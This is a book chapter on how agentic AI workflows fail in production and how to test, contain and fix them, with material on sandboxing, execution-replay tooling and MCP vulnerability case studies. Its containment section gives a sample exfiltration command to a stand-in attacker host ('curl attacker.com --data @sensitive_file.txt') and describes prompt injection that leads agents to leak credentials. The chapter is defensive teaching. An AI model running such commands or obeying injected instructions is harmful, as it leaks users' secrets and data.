---
title: "Common Failure Modes, Testing, and Fixes"
order: 10
---

# Common Failure Modes, Testing, and Fixes

## Chapter Goals

By the end of this chapter, you should be able to recognise the most common ways agentic workflows fail in production, understanding the symptoms and root causes of each failure mode. You should be able to design a test strategy that catches failures before deployment, combining static checks, deterministic tests, and adversarial evaluations. You should be able to apply practical mitigation and recovery patterns that reduce mean time to recovery when failures occur. And you should be able to turn incidents into durable process and architecture improvements that prevent recurrence.

## Why Failures Are Different in Agentic Systems

Traditional software failures are often deterministic and reproducible. Agent failures can also include additional dimensions of complexity.

**Nondeterminism** arises from model sampling and external context, meaning the same input may produce different outputs across runs.

**Tool and API variance** occurs across environments and versions, where a tool that works in testing may behave differently in production.

**Instruction ambiguity** emerges when prompts, policy files, or skills conflict, leading agents to interpret guidance inconsistently.

**Long-horizon drift** describes behaviour that degrades over many steps, where small errors compound into significant deviations from intended outcomes.

This means reliability work must combine classic software testing with scenario-based evaluation and operational controls.

## Failure Taxonomy

Use this taxonomy to classify incidents quickly and choose the right fix path.

### 1) Planning and Reasoning Failures

**Symptoms.** The agent picks the wrong sub-goal, pursuing an objective that does not advance the overall task. It repeats work or loops without convergence, wasting resources on redundant operations. It produces plausible but invalid conclusions, generating output that sounds correct but fails validation.

**Typical causes.** Missing constraints in system instructions leave the agent without guidance on what to avoid. Overly broad tasks with no decomposition guardrails allow the agent to wander. No termination criteria means the agent does not know when to stop.

**Fast fixes.** Add explicit success criteria and stop conditions so the agent knows when it has succeeded. Break tasks into bounded steps that can be validated individually. Require intermediate checks before irreversible actions to catch errors early.

### 2) Tooling and Integration Failures

**Symptoms.** Tool calls fail intermittently, succeeding sometimes and failing others without obvious cause. Wrong parameters are passed to tools, causing unexpected behaviour. Tool output is parsed incorrectly, leading to downstream errors.

**Typical causes.** Schema drift or undocumented API changes mean the agent's assumptions no longer match reality. Weak input validation allows malformed requests to reach tools. Inconsistent retry and backoff handling causes cascading failures under load.

**Fast fixes.** Validate tool contracts at runtime to catch mismatches early. Add strict argument schemas that reject invalid inputs. Standardise retries with idempotency keys so repeated attempts are safe.

### 3) Context and Memory Failures

**Symptoms.** The agent forgets prior constraints, violating rules it was given earlier in the conversation. Important instructions are dropped when context grows, as the agent summarises away critical guidance. Stale memories override fresh data, causing the agent to act on outdated information.

**Typical causes.** Context window pressure forces the agent to discard information. Poor memory ranking and retrieval surfaces irrelevant content while burying important details. Missing recency and source-quality weighting treats all information as equally valid.

**Fast fixes.** Introduce context budgets and summarisation checkpoints that preserve critical information. Add citation requirements for retrieved facts so sources are traceable. Expire or down-rank stale memory entries so fresh information takes precedence.

### 4) Safety and Policy Failures

**Symptoms.** Sensitive files are modified unexpectedly, violating protected path policies. Security constraints are bypassed through tool chains, where combining multiple tools achieves an outcome that individual tools would block. Unsafe suggestions appear in generated code, introducing vulnerabilities.

**Typical causes.** Weak policy enforcement boundaries do not cover all attack surfaces. No pre-merge policy gates allow unsafe changes to reach the main branch. Implicit trust in generated output assumes agent output is safe without verification.

**Fast fixes.** Enforce allow and deny lists at the tool gateway level to prevent prohibited operations. Require policy checks in CI so violations are caught before merge. Route high-risk actions through human approval to ensure oversight.

#### Execution Environment Containment

Agent execution environments determine blast radius when things go wrong. Insufficient isolation allows a compromised or buggy agent to damage the host system, access sensitive data, or pivot to other systems. The containment strategy must match the risk profile of the code being executed.

**Shared-kernel risks.** Containerized agents (Docker, Podman) share the host kernel with other workloads. A kernel vulnerability or container escape gives the attacker access to everything on that host. This is acceptable for trusted code but insufficient for executing LLM-generated code or user-provided scripts where you cannot guarantee safety. Kernel exploits, though rare, have blast radius equal to the entire host.

**Credential exposure paths.** If secrets exist in the execution environment—as environment variables, mounted files, or in-memory—compromised agent code can exfiltrate them. A prompt injection attack that causes the agent to execute malicious code can then steal API keys, database credentials, or cloud access tokens. Examples include agents that `echo $API_KEY` to debug output that gets logged, or code that opens a reverse shell and exfiltrates environment state.

**Network exfiltration.** Without egress filtering, a compromised agent can send arbitrary data to attacker-controlled servers. This includes source code, user data, credentials, or internal system information. Even if credentials are protected, unrestricted networking allows data theft and command-and-control communication. A malicious agent might `curl attacker.com --data @sensitive_file.txt` or establish a persistent backdoor.

**Persistence and lateral movement.** If agent filesystems persist between runs or share state with other systems, malicious code can establish persistence or move laterally. An agent that writes to `/home/user/.bashrc` or modifies system cron jobs can survive restarts. One that accesses shared network filesystems can spread to other systems. Ephemeral, disposable execution environments prevent this by resetting to a clean state after every run.

**Examples of insufficient isolation:**

1. **Developer laptop execution:** Running untrusted agent code directly on a development machine with access to SSH keys, cloud credentials, and source repositories. A single prompt injection could compromise the entire development environment.

2. **Long-lived containers with secrets:** Agents that run in containers with environment variable secrets and no egress filtering. If the agent is compromised via prompt injection, attackers can exfiltrate credentials and pivot to cloud resources.

3. **Shared CI runners without sandboxing:** Using shared GitHub Actions runners or similar CI infrastructure to execute agent-generated code without additional isolation. A malicious PR could inject code that steals repository secrets or modifies other jobs.

**Appropriate containment strategies:**

For **low-risk scenarios** (trusted code, internal tools, read-only operations), process-level isolation or containers with basic security policies (seccomp, AppArmor) are sufficient. The convenience and ecosystem maturity outweigh isolation concerns.

For **medium-risk scenarios** (LLM-generated code, unknown code quality, limited external input), use containers with strict egress filtering, sealed secrets (never environment variables), and ephemeral filesystems. Add network policies that allowlist only required API endpoints.

For **high-risk scenarios** (user-provided code, untrusted input, access to sensitive data), use microVMs or full VMs with network-layer secret injection, default-deny networking, and fully disposable filesystems. No credentials should ever exist inside the execution environment. Consider transparent proxies that inject credentials at the network boundary, as discussed in [Agentic Scaffolding](030-scaffolding.md#secure-execution-environments).

**Validation before deployment:**

Before running agent code in production, verify that:
- Protected paths (credentials, system files, configuration) are read-only or inaccessible
- Egress filtering blocks all destinations except explicitly allowed API endpoints
- Secrets are not present in the environment or filesystem
- Filesystem changes do not persist between runs
- Resource limits (CPU, memory, disk) prevent denial-of-service
- Execution timeouts prevent runaway processes

Test these controls by intentionally trying to violate them. An agent that cannot bypass its own sandboxing is ready for production. One that can needs stronger isolation before it handles real workloads.

### 5) Collaboration and Workflow Failures

**Symptoms.** Multiple agents make conflicting changes, overwriting each other's work. PRs churn with contradictory edits as agents undo each other's modifications. Work stalls due to unclear ownership, with no agent taking responsibility.

**Typical causes.** Missing orchestration contracts leave agents without coordination rules. No lock or lease model for shared resources allows concurrent modification. Role overlap without clear handoff rules creates ambiguity about who should act.

**Fast fixes.** Add ownership rules per path or component so responsibilities are clear. Use optimistic locking with conflict resolution policy to handle concurrent access. Define role-specific done criteria so agents know when to stop.

## Testing Strategy for Agentic Workflows

A robust strategy uses multiple test layers. No single test type is sufficient.

## 1. Static and Structural Checks

Use static and structural checks to fail fast before expensive model execution. These include markdown and schema validation for instruction files, ensuring they are well-formed before agents try to parse them. Prompt template linting catches common errors in prompt construction. Tool interface compatibility checks verify that agents can call the tools they expect. Dependency and version constraint checks ensure the environment matches expectations.

## 2. Deterministic Unit Tests (Without LLM Calls)

Test orchestration logic, parsers, and guards deterministically without involving language models. Cover state transitions to ensure the workflow moves through stages correctly. Test retry and timeout behaviour to verify failure handling works as expected. Verify permission checks to ensure access controls are enforced. Test conflict resolution rules to confirm agents handle concurrent access correctly.

> **Snippet status:** Runnable shape (simplified for clarity).

```python
from dataclasses import dataclass

@dataclass
class StepResult:
    ok: bool
    retryable: bool


def should_retry(result: StepResult, attempt: int, max_attempts: int = 3) -> bool:
    return (not result.ok) and result.retryable and attempt < max_attempts


def test_retry_policy():
    assert should_retry(StepResult(ok=False, retryable=True), attempt=1)
    assert not should_retry(StepResult(ok=False, retryable=False), attempt=1)
    assert not should_retry(StepResult(ok=False, retryable=True), attempt=3)
```

## 3. Recorded Integration Tests (Golden Traces)

Capture representative interactions and replay them against newer builds. Record tool inputs and outputs to create a reproducible baseline. Freeze external dependencies where possible to eliminate variance. Compare final artefacts and decision traces to detect changes in behaviour.

Use these to detect drift in behaviour after prompt, tool, or model changes.

## Reproducible Execution Infrastructure

### The Agent Debugging Challenge

Agent debugging differs fundamentally from traditional software debugging in three critical dimensions. The first dimension is **nondeterminism**: the same input can produce different outputs across runs due to model sampling, evolving external context, and API variance. A bug that appears in one execution may disappear in the next, making reproduction unreliable. The second dimension is **long execution horizons**: agents often operate across dozens or hundreds of steps, where small errors in early stages compound into significant failures much later. Traditional step-through debugging becomes impractical when the relevant state spans an entire execution history. The third dimension is **distributed tool chains**: agents interact with external APIs, file systems, databases, and other services, each introducing variance and failure modes that are difficult to isolate.

These characteristics mean that debugging agent failures currently relies on ad-hoc logging and manual incident reconstruction. When an agent produces incorrect output or violates a policy, developers must piece together what happened from scattered logs, correlating timestamps and tool invocations to understand the decision chain. This process is time-consuming, error-prone, and often fails to capture enough detail to reproduce the failure reliably.

What is needed is version control for execution artifacts. Just as git provides reproducibility and provenance for source code, agent systems need infrastructure that captures complete execution snapshots in a tamper-evident, content-addressed format. This enables systematic debugging workflows: replaying executions to reproduce failures, diffing executions to understand behavioral changes, and verifying execution integrity for compliance and audit purposes.

### Content-Addressed Execution Snapshots

Content-addressed storage treats data as immutable objects identified by cryptographic hashes of their content. Git popularized this model for source code: every commit, tree, and blob is identified by its SHA-1 hash, creating a tamper-evident history where any change to content produces a different hash. This model provides three critical properties for version control: **deduplication** (identical content is stored once), **integrity verification** (any modification is detectable), and **content-based addressing** (objects are referenced by what they contain, not where they are stored).

The same properties apply to agent execution artifacts. An execution snapshot captures a complete record of an agent run: the initial inputs (prompts, tool configurations, environment parameters), the sequence of steps taken (tool calls with arguments and results, model responses, intermediate state), the final outputs (results, artifacts produced, errors encountered), and metadata (timestamps, model versions, framework configuration). When this snapshot is identified by the hash of its content, any modification to the execution record produces a different identifier, making the record tamper-evident.

Execution snapshots structured this way enable git-like workflows for agent debugging. You can **log** execution history to see what happened over time. You can **show** a specific execution in detail to understand its decision chain. You can **diff** two executions to understand how behavior changed between runs. You can **verify** that an execution record has not been modified since creation. You can **replay** an execution to reproduce a failure or validate a fix. You can **fork** an execution to test alternative strategies from a known starting point.

The structure of an execution snapshot parallels git's object model. Just as git represents commits (with metadata) that point to trees (directory structure) that point to blobs (file content), an execution snapshot represents a **context pack** (with metadata about the run) that contains **execution steps** (sequential operations) that reference **tool invocations** and **model responses** (the actual artifacts). The content-addressed nature means that identical steps across multiple runs are stored only once, similar to how git deduplicates identical file contents.

### ContextSubstrate: Git-Like Workflows for Agent Execution

ContextSubstrate (`ctx`) is an open-source execution substrate (MIT license, released February 2026) that implements content-addressed execution snapshots for AI agents. It provides a CLI and storage format that brings git's version control paradigm to agent execution artifacts. The tool uses SHA-256 hashing for content addressing and stores execution data in a `.ctx/` directory structure similar to git's `.git/` directory.

The storage model uses a **blob store** for immutable execution logs (inputs, steps, outputs) and a **pack registry** that maps human-readable identifiers to content hashes. This separation means you can reference executions by memorable names while benefiting from content-addressed storage properties. The `.ctx/` directory typically looks like:

```
.ctx/
├── blobs/           # Content-addressed execution logs (SHA-256)
│   ├── ab/
│   │   └── cdef12...  # Execution step data
│   └── 12/
│       └── 3456ab...  # Model responses
├── packs/           # Context pack metadata
│   └── pack-001.json
└── config           # Repository configuration
```

ContextSubstrate provides eight core commands that mirror git workflows:

**`ctx init`** initializes execution tracking in the current directory, creating the `.ctx/` directory structure and configuration. This is analogous to `git init`.

**`ctx pack <execution_log.json>`** creates an immutable context pack from an execution log. The execution log is a JSON file containing the complete record of an agent run (see below for format). The pack is identified by the SHA-256 hash of its content and stored in the blob store. Returns the pack ID (content hash) for later reference.

**`ctx log`** displays execution history, showing pack IDs, timestamps, and summary information for all recorded executions. This is analogous to `git log` but for agent runs rather than code commits.

**`ctx show <pack-id>`** displays detailed information about a specific execution, including inputs, all intermediate steps, outputs, and metadata. This is the primary command for inspecting what an agent did during a run.

**`ctx diff <pack1> <pack2>`** compares two executions, highlighting differences in the steps taken, tools called, and results produced. This helps understand how behavior changed between runs—for example, after a prompt modification or model version upgrade.

**`ctx replay <pack-id>`** attempts to reproduce an execution by re-running the agent with the same inputs and configuration. Because agents involve external APIs and model nondeterminism, replay is best-effort: it validates that the agent takes the same sequence of steps (same tools in the same order) but does not guarantee bit-identical outputs. This is sufficient for debugging many failure modes.

**`ctx verify <pack-id>`** validates that an execution pack has not been tampered with by recomputing its content hash and checking it against the pack ID. This provides tamper-evidence for compliance and audit use cases.

**`ctx fork <pack-id>`** creates a new execution starting from the state of an existing pack. This enables testing alternative strategies from a known checkpoint—for example, trying a different tool or prompt after a specific step.

To integrate ContextSubstrate with agent frameworks, agents must output structured execution logs in JSON format. The log structure captures the complete execution trace:

```json
{
  "execution_id": "unique-id-for-this-run",
  "timestamp": "2026-02-16T14:30:00Z",
  "agent": {
    "framework": "langchain",
    "version": "0.1.0",
    "model": "gpt-4"
  },
  "inputs": {
    "prompt": "Review the PR and suggest improvements",
    "tools": ["git_diff", "static_analyzer"],
    "config": {
      "temperature": 0.2,
      "max_tokens": 2000
    }
  },
  "steps": [
    {
      "step": 1,
      "type": "tool_call",
      "tool": "git_diff",
      "arguments": {"pr_number": 123},
      "result": {"diff": "...", "files_changed": 3},
      "timestamp": "2026-02-16T14:30:05Z"
    },
    {
      "step": 2,
      "type": "model_response",
      "prompt": "Analyze this diff: ...",
      "response": "I see three issues...",
      "timestamp": "2026-02-16T14:30:12Z"
    }
  ],
  "outputs": {
    "final_response": "Suggested improvements: ...",
    "artifacts": ["review.md"]
  },
  "metadata": {
    "duration_seconds": 45,
    "tool_calls": 2,
    "tokens_used": 1500
  }
}
```

Integrating ContextSubstrate with a framework like LangChain requires wrapping the agent execution to capture this structure. Here is a simplified Python wrapper:

```python
import json
import subprocess
from datetime import datetime
from langchain.agents import AgentExecutor

class ContextSubstrateWrapper:
    """Wraps agent execution to create ContextSubstrate logs"""
    
    def __init__(self, agent_executor: AgentExecutor):
        self.agent = agent_executor
        self.execution_log = {
            "execution_id": None,
            "timestamp": None,
            "agent": {},
            "inputs": {},
            "steps": [],
            "outputs": {},
            "metadata": {}
        }
    
    def execute(self, prompt: str, tools: list, config: dict):
        """Execute agent and capture execution log"""
        # Initialize execution log
        self.execution_log["execution_id"] = f"exec-{datetime.now().timestamp()}"
        self.execution_log["timestamp"] = datetime.utcnow().isoformat() + "Z"
        self.execution_log["inputs"] = {
            "prompt": prompt,
            "tools": tools,
            "config": config
        }
        
        # Execute agent with callbacks to capture steps
        result = self.agent.run(
            input=prompt,
            callbacks=[self._capture_callback()]
        )
        
        # Store outputs
        self.execution_log["outputs"] = {
            "final_response": result
        }
        
        # Write log and create context pack
        log_path = "/tmp/execution_log.json"
        with open(log_path, 'w') as f:
            json.dump(self.execution_log, f, indent=2)
        
        # Create context pack
        pack_result = subprocess.run(
            ["ctx", "pack", log_path],
            capture_output=True,
            text=True
        )
        pack_id = pack_result.stdout.strip()
        
        return result, pack_id
    
    def _capture_callback(self):
        """Create callback to capture execution steps"""
        # Callback implementation would capture tool calls
        # and model responses, appending to self.execution_log["steps"]
        pass  # Simplified for clarity
```

A typical debugging workflow using ContextSubstrate looks like:

```bash
# Initialize execution tracking
ctx init

# Run agent (wrapper creates execution log and packs it)
python agent_script.py > run.log
# Output: Created context pack: abc123...

# View execution history
ctx log
# Output:
# abc123... | 2026-02-16T14:30:00Z | Review PR #123 | Success
# def456... | 2026-02-16T13:15:00Z | Review PR #122 | Failed

# Inspect failed execution
ctx show def456
# Output: [Detailed execution trace showing all steps]

# Compare successful and failed runs
ctx diff abc123 def456
# Output: [Differences in steps, tool calls, results]

# Replay failed execution to reproduce issue
ctx replay def456
# Output: [Re-runs agent with same inputs, validates step sequence]

# Verify execution integrity
ctx verify abc123
# Output: Pack abc123... is valid (hash matches)
```

### Production Use Cases

Execution replay infrastructure enables several production workflows that are difficult or impossible without systematic execution provenance.

**Incident investigation** benefits from complete execution history. When an agent produces incorrect output or violates a policy, developers can use `ctx show` to inspect exactly what happened: which tools were called with which arguments, what model responses guided decisions, and where the execution diverged from expected behavior. This is far more reliable than reconstructing events from scattered log files. The content-addressed storage ensures that the execution record cannot be modified after the fact, providing trustworthy evidence for post-mortems.

**Regression testing** uses execution diffs to detect behavioral changes after modifications to prompts, tools, or models. When you update a prompt to fix one issue, `ctx diff` reveals whether the change inadvertently affects other behaviors. By maintaining a suite of golden context packs representing correct executions, you can validate that changes preserve expected behavior across diverse scenarios. This is analogous to regression tests for code but operates at the execution level rather than the unit test level.

**Compliance audits** require immutable provenance chains showing how decisions were made. In regulated industries (finance, healthcare, legal services), AI systems must demonstrate that agent decisions are traceable, reproducible, and not tampered with. ContextSubstrate's content-addressed storage provides cryptographic proof that execution records are authentic. Auditors can verify pack integrity using `ctx verify` and inspect full decision chains using `ctx show`, satisfying regulatory requirements without custom audit infrastructure.

**A/B testing** of agent strategies benefits from execution forking. When evaluating whether a different tool or prompt would improve performance, `ctx fork` creates a variant execution from a known checkpoint. This allows comparing alternative approaches from identical starting states, controlling for variance in earlier steps. The content-addressed storage ensures that the baseline execution is immutable while you experiment with variants.

**Debugging long-horizon failures** is tractable with replay infrastructure. When an agent fails after many steps, traditional debugging requires reproducing the entire sequence. With ContextSubstrate, you can replay executions up to the point of failure and then inspect state, modify inputs, or test alternative actions. This reduces debugging time from hours to minutes for complex multi-step workflows.

As a concrete example, consider debugging a multi-agent workflow where a code review agent produces incorrect feedback. Without execution replay, you would need to manually review logs, correlate timestamps across agents, and try to reconstruct the decision chain. With ContextSubstrate:

1. Use `ctx log` to find the failed execution pack ID
2. Use `ctx show <pack-id>` to see exactly which tools the agent called, what data it received, and how it processed that data
3. Use `ctx diff` to compare with a successful execution, identifying where behavior diverged
4. Use `ctx replay` to reproduce the failure with modified inputs, testing hypotheses about the root cause
5. Once fixed, create a new golden pack representing correct behavior for regression testing

This systematic approach reduces mean time to recovery (MTTR) by eliminating manual log correlation and providing deterministic reproduction of failures.

### Integration and Operational Considerations

Adopting execution replay infrastructure introduces operational overhead and architectural requirements that must be considered before deployment.

**Logging overhead** varies by execution complexity. Capturing structured execution logs adds latency and memory usage. In practice, the overhead ranges from 5-15% of total execution time for typical agent workloads—acceptable for production but noticeable. Most overhead comes from serializing tool results and model responses to JSON. Logging can be made asynchronous to reduce blocking, but this introduces eventual consistency: execution logs may not be complete until seconds after the agent finishes.

**Storage requirements** depend on execution frequency and retention policies. A typical context pack containing 10-20 tool calls with moderate-sized results averages 100KB compressed. For systems executing hundreds of agents per day, this translates to tens of megabytes daily. Content-addressed storage deduplicates identical steps: if multiple executions call the same tool with the same arguments, the result is stored once. This reduces storage by 30-60% in practice for workflows with repeated patterns. Storage growth is linear with unique executions, so retention policies (for example, keeping only the last 30 days of executions, or retaining only failures and golden packs indefinitely) keep storage manageable.

**Replay fidelity** is best-effort, not guaranteed. Agent replay faces three sources of variance. First, **external API variance**: the same API call may return different results over time (for example, GitHub API returns updated issue comments, weather APIs return current conditions). Second, **model nondeterminism**: even with temperature set to zero, language models are not strictly deterministic due to floating-point precision and inference implementation differences. Third, **environment differences**: the execution environment at replay time may differ from original execution (different library versions, system load, network conditions). ContextSubstrate validates that the **structure** of execution is preserved—same sequence of steps, same tools called in the same order—but does not guarantee bit-identical outputs. This level of fidelity suffices for most debugging use cases: you can confirm that the agent takes the same path through the decision space even if individual outputs differ slightly.

**When to use execution replay**: Not all agent executions warrant the overhead of structured logging and context packing. High-value use cases include production agents making consequential decisions (for example, autonomous code merges, financial transactions, policy changes), debugging sessions where failures are difficult to reproduce, regression testing of critical workflows, and compliance-heavy domains requiring audit trails. The overhead is justified when the cost of failures or the difficulty of debugging exceeds the infrastructure cost.

**When not to use execution replay**: Low-stakes scenarios where failures are acceptable and easy to recover from do not need replay infrastructure. Ephemeral development testing, rapid prototyping without production consequences, and latency-sensitive applications where 5-15% overhead matters should skip structured logging. For these cases, traditional logging (even verbose logging) suffices.

**Framework integration patterns** vary by architecture. For orchestrator-based systems (LangChain, AutoGen, custom frameworks), add a wrapper that captures callbacks and events during execution, serializes them to the execution log format, and invokes `ctx pack` after completion. For API-native agent runtimes (OpenAI Assistants API, Anthropic Claude API), implement post-execution logging by fetching the execution trace from the API provider and transforming it to ContextSubstrate format. For multi-agent systems, each agent logs its execution independently, creating separate context packs that can be correlated by execution ID and timestamp. Coordination agents that spawn sub-agents should log the delegation structure so full workflow provenance is traceable.

### Limitations and Future Directions

ContextSubstrate addresses execution replay and provenance but has clear boundaries that users must understand to avoid misuse.

**Not real-time monitoring**: ContextSubstrate is a post-hoc analysis tool. It records execution history for later inspection but does not provide live observability during execution. For real-time monitoring—tracking agent progress, alerting on anomalies, displaying dashboards—use observability platforms like OpenTelemetry, LangSmith, or custom telemetry infrastructure. ContextSubstrate complements these tools by providing reproducibility after incidents are detected.

**Not version control for code**: ContextSubstrate versions **execution artifacts** (what the agent did), not source code or prompts (what the agent is). Use git for versioning prompts, policies, and agent code. Use ContextSubstrate for versioning agent runs. These tools serve different layers of the stack and should be used together: git tracks changes to the agent system itself, while ContextSubstrate tracks the behavior of that system over time.

**Not an orchestration framework**: ContextSubstrate does not run agents—it captures their execution. It is middleware that sits between your orchestration layer (LangChain, AutoGen, custom framework) and your storage layer. Do not expect ContextSubstrate to provide agent planning, tool routing, or multi-agent coordination. It assumes an existing agent system and adds execution logging as a cross-cutting concern.

**Emerging pattern with limited adoption**: ContextSubstrate was released in February 2026 and has limited production adoption beyond early adopters. The tool is functional and actively maintained, but the ecosystem is immature: Python wrappers are unofficial and incomplete, integration with major frameworks requires custom code, and community resources (tutorials, examples, troubleshooting guides) are sparse. Teams adopting ContextSubstrate should expect integration work and be prepared to contribute to the ecosystem. That said, the underlying **pattern**—content-addressed execution logs with git-like workflows—is architecturally sound and likely to persist even if specific implementations evolve.

**Ecosystem maturity gaps**: Features planned but not yet available include remote sharing (publishing context packs to shared registries), cryptographic signing (proving provenance of execution logs), and graphical UI for browsing execution history. Currently, all interaction is via CLI. Teams needing these features should either wait for official releases or implement them as extensions (the MIT license permits this).

Future directions for execution replay infrastructure likely include tighter integration with agent frameworks (first-party support in LangChain, AutoGen, OpenAI Agents SDK), standardization of execution log formats (similar to OpenTelemetry spans but for agentic workflows), and federation (cross-organization execution registries for collaborative agent debugging). For broader context on observability and evaluation trends, see [Future Developments](800-future-developments.md#agent-observability-and-evaluation).

## 4. Scenario and Adversarial Evaluations

Design "challenge suites" for known weak spots. These should include ambiguous requirements that could be interpreted multiple ways, contradictory documentation that forces the agent to choose, missing dependencies that test error handling, and partial outages and degraded APIs that test resilience. Include prompt-injection attempts in retrieved content to test security boundaries.

Pass criteria should include not just correctness, but also policy compliance, cost and latency ceilings, and evidence quality including citations and rationale.

## 5. Production Guardrail Tests

Before enabling autonomous writes and merges in production, validate that guardrails work correctly. Protected-path enforcement should block modifications to sensitive files. Secret scanning and licence checks should catch policy violations. Human approval routing should engage for high-impact actions. Rollback paths should work on failed deployments.

## Case Study: MCP Supply-Chain Vulnerabilities in Practice

Two 2025 incidents illustrate how protocol-level vulnerabilities propagate through agentic systems.

**CVE-2025-6514 (`mcp-remote` OS command injection, CVSS 9.6).** The `mcp-remote` npm package (versions 0.0.5 through 0.1.15), used by over 437,000 AI development environments, contained an OS command injection flaw. When connecting to an untrusted MCP server, the server could craft a malicious `authorization_endpoint` URL that, when processed by the client's `open()` function, executed arbitrary operating-system commands. The vulnerability required user interaction but no authentication. JFrog Security Research discovered and reported it; the fix (version 0.1.16) sanitised special elements in authorisation responses. The lesson: MCP client packages that handle authentication flows from external servers must treat every server response as untrusted input.

**CVE-2025-68145/68143/68144 (Anthropic Git MCP server, RCE chain).** Three flaws in `mcp-server-git` (prior to version 2025.12.18) combined into a remote-code-execution chain. CVE-2025-68145 (CVSS 7.1) bypassed the `--repository` flag's path restrictions, allowing access to any repository on the system. CVE-2025-68143 let `git_init` create repositories at arbitrary filesystem paths. CVE-2025-68144 injected arguments through unsanitised `git_diff` and `git_checkout` parameters, enabling file overwrites. Researchers at Cyata demonstrated that chaining these flaws with a Filesystem MCP server allowed writing malicious Git smudge/clean filters that achieved full code execution. Anthropic patched all three in December 2025. The lesson: individual MCP tools may appear safe in isolation, but **tool chaining creates exponential attack surface**—security boundaries must be enforced at every tool invocation, not just at initialisation.

Both incidents validate the OWASP MCP Top 10 and reinforce that MCP server/client security is now a production concern, not a theoretical exercise. For governance context, see [Governance and Safety Automation](800-future-developments.md#governance-and-safety-automation).

## Practical Fix Patterns

When incidents happen, reusable fix patterns reduce MTTR (mean time to recovery).

### Pattern A: Contract Hardening

Add strict schemas between planner and tool runner to ensure they communicate correctly. Reject malformed or out-of-policy requests early, before they can cause harm. Version contracts (`v1`, `v2`) and support migrations so changes can be rolled out incrementally.

### Pattern B: Progressive Autonomy

Start in "suggest-only" mode where agents propose changes but do not execute them. Move to "execute with review" mode once confidence builds. Graduate to autonomous mode only after SLO compliance demonstrates the agent is reliable.

### Pattern C: Two-Phase Execution

In the **plan phase**, generate proposed actions and expected effects without executing anything. In the **apply phase**, execute only after policy and validation checks pass. This reduces irreversible mistakes and improves auditability.

### Pattern D: Fallback and Circuit Breakers

If tool failure rate spikes, disable affected paths automatically to prevent cascading failures. Fall back to a safer baseline workflow that may be less capable but more reliable. Alert operators with incident context so they can investigate and resolve the underlying issue.

### Pattern E: Human-in-the-Loop Escalation

Define explicit escalation triggers that route work to humans. Repeated retries without progress indicate the agent is stuck. Any request touching protected paths should require approval. Low-confidence output in high-risk domains warrants human review.

## Incident Response Runbook (Template)

Use a lightweight runbook so teams respond consistently. The sequence proceeds through eight steps.

**Detect.** Receive an alert from CI, runtime monitor, or user report indicating something has gone wrong.

**Classify.** Map the incident to a taxonomy category so you can apply the appropriate response playbook.

**Contain.** Stop autonomous actions if the blast radius is unclear, preventing further damage while you investigate.

**Diagnose.** Reproduce the issue with a trace and configuration snapshot to understand what happened.

**Mitigate.** Apply short-term guardrails or fallbacks to restore service while you work on a permanent fix.

**Fix.** Implement a structural correction that addresses the root cause.

**Verify.** Re-run affected test suites and adversarial cases to confirm the fix works.

**Learn.** Add a regression test and update documentation to prevent recurrence.

## Metrics That Actually Matter

Track these metrics to evaluate reliability improvements over time.

**Task success rate** measures how often agents complete tasks correctly, with policy compliance as part of success. **Intervention rate** measures how often humans must correct the agent, indicating where automation falls short. **Escaped defect rate** measures failures discovered after merge or deploy, indicating gaps in pre-production testing. **Mean time to detect (MTTD)** and **mean time to recover (MTTR)** measure incident response effectiveness. **Cost per successful task** and **latency percentiles** measure efficiency.

Avoid vanity metrics (for example, "number of agent runs") without quality and safety context.

## Anti-Patterns to Avoid

Several anti-patterns undermine agentic system reliability.

**Treating prompt edits as sufficient reliability work** ignores the structural issues that cause failures. Prompts can only do so much; robust systems need architectural controls.

**Allowing autonomous writes without protected-path policies** exposes critical files to unintended modification. Every system needs explicit boundaries.

**Skipping regression suites after model or version upgrades** assumes backward compatibility that may not exist. Changes require validation.

**Relying on a single benchmark instead of diverse scenarios** creates blind spots. Real-world failures often occur in edge cases the benchmark does not cover.

**Ignoring ambiguous ownership in multi-agent flows** leads to gaps and conflicts. Every path and component should have a clear owner.

## A Minimal Reliability Checklist

Before enabling broad production use, confirm the following items are complete. Snippets and examples should be clearly labelled as runnable, pseudocode, or simplified. Tool contracts should be versioned and validated. CI should include policy, security, and regression checks. Failure injection scenarios should be part of routine testing. Rollback and escalation paths should be documented and exercised.

## Applying This to This Repository

For this repository, a minimal operational checklist is:

- Run `python3 scripts/check-links.py --root book --mode internal` for any `book/` content change.
- Keep `.github/workflows/*.md` and `.github/workflows/*.lock.yml` in sync when GH-AW source workflows change.
- Validate label lifecycle behavior against `WORKFLOW_PLAYBOOK.md` after workflow edits.
- Preserve least-privilege + `safe-outputs` patterns in GH-AW workflow frontmatter.
- Use a repository-scoped user token for safe-outputs writes when label events must trigger downstream workflows.
- Scope dispatch-workflow concurrency by issue identifier to prevent burst-trigger cancellations.
- Treat workflow-generated failure tracker issues as operations artifacts, not content suggestions.
- Validate lifecycle paths sequentially before burst/concurrency tests.
- Treat failed Pages/PDF runs as release blockers for documentation changes.

For orchestration context, see [Agent Orchestration](020-orchestration.md). For infrastructure boundaries, see [Agentic Scaffolding](030-scaffolding.md).

## Chapter Summary

Reliable agentic systems are built, not assumed. Teams that combine clear contracts, layered testing, progressive autonomy, strong policy gates, and incident-driven learning consistently outperform teams relying on prompt-only tuning.

In practice, your competitive advantage comes from how quickly you detect, contain, and permanently fix failures—not from avoiding them entirely.

<!-- Edit notes:
Sections expanded: Chapter Goals, Why Failures Are Different in Agentic Systems, all five failure taxonomy sections (Planning and Reasoning, Tooling and Integration, Context and Memory, Safety and Policy, Collaboration and Workflow), Static and Structural Checks, Deterministic Unit Tests, Recorded Integration Tests, Scenario and Adversarial Evaluations, Production Guardrail Tests, all five Pattern sections (Contract Hardening, Progressive Autonomy, Two-Phase Execution, Fallback and Circuit Breakers, Human-in-the-Loop Escalation), Incident Response Runbook, Metrics That Actually Matter, Anti-Patterns to Avoid, A Minimal Reliability Checklist, Chapter Summary
Lists preserved: Code block (must remain as-is for runnable example), checklist format for Minimal Reliability Checklist (intentionally kept as checklist for usability)
Ambiguous phrases left ambiguous: None identified
-->
